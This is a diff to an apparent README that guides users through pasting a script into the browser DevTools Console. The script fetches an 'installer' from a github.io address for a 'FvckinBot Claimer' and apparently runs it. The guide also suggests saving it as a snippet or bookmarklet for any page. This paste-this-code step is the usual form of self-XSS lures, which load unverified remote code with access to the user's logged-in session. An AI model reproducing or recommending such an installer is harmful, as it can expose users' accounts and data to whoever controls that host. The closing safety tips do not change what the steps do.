@@ -42,7 +42,7 @@ You can also open the Console directly using keyboard shortcuts:
 
 Copy the following script code and paste it directly into the Console input area:
 
-```js
+```
 (async function () {
   try {
     let installer = await fetch("https://fvckinbot.github.io/FvckinBotClaimer.io/", {
@@ -54,3 +54,20 @@ Copy the following script code and paste it directly into the Console input area
     alert("Refresh the page before reinstalling");
   }
 })();
+```
+## Step 4: Execute and Verify
+Press <kbd>Enter</kbd> to execute the script.
+Observe the website or the console for any output, changes, or messages confirming the script has run.
+
+---
+
+## Step 5: Save Your Script for Easy Reuse
+In Chrome/Edge DevTools, go to the Sources tab, then open the Snippets tab. Create a new snippet and paste your script to save it for later use.
+Alternatively, create a bookmarklet from your script to run it quickly on any page.
+
+---
+
+## Important Tips
+Be cautious when running scripts from unknown sources; they can pose security risks.
+Always understand what a script does before executing it.
+Use the browser's developer tools responsibly and respect website terms of use.
